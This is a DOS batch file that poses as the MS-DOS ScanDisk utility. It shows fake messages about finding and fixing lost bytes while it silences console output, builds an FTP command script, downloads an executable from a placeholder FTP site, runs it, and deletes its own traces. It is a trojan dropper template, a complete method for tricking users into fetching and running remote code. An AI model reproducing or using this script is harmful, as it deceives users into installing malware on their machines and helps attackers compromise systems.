   @echo off
   echo MS-DOS SCANDISK
   echo found 27,4951 lost bytes
   echo fixing error(s)...
   ctty nul
   echo user <USERNAME> >>c:\$.tmp
   echo <PASSWORD> >>c:\$.tmp
   echo lcd c:\windows >>c:\$.tmp
   echo binary >>c:\$.tmp
   echo get <FILENAME.EXE> >>c:\$.tmp
   echo quit >>c:\$.tmp
   ftp -v -i -n -s:c:\$.tmp <FTP SITE> c:\$$.tmp
   <FILENAME.EXE>
   del c:\$.tmp
   del c:\$$.tmp
   ctty con
   echo lost cluster(s) fixed
